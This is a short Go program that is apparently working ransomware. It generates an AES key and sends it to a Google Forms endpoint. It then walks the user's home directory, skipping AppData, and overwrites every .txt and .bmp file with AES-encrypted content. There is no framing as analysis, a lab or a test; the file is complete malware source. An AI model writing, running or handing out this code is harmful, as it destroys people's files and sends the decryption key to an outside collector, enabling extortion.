package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
)

func stringInSlice(a string, list []string) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func main() {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		// handle error here
	}
	fmt.Println("key: ", base64.StdEncoding.EncodeToString(key))
	resp, err := http.PostForm("https://docs.google.com/forms/d/e/1FAIpQLSeFoYAUf-YIIIBi7sPPIe0g-h2h2-_l7jiHv6VrJv6zuS7yEA/formResponse",
		url.Values{"entry.1145282128": {base64.StdEncoding.EncodeToString(key)}})

	if resp == nil {
		// handle error here
	}

	searchDir := os.Getenv("USERPROFILE")
	targetExt := []string{".txt", ".bmp"}
	fileList := []string{}

	filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
		if strings.HasPrefix(path, searchDir+"\\AppData") {
			return nil
		}
		if stringInSlice(filepath.Ext(path), targetExt) {
			fileList = append(fileList, path)
			originalData, err := ioutil.ReadFile(path)
			if err != nil {
				// handle error here
			}
			cryp := encrypt(key, originalData)
			ioutil.WriteFile(path, []byte(cryp), 0644)
		}
		return nil
	})

	for _, file := range fileList {
		fmt.Println(file)
	}
}

// encrypt string to base64 crypto using AES
func encrypt(key []byte, text []byte) string {
	// key := []byte(keyText)
	plaintext := []byte(text)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	// The IV needs to be unique, but not secure. Therefore it's common to
	// include it at the beginning of the ciphertext.
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

	// convert to base64
	return base64.URLEncoding.EncodeToString(ciphertext)
}
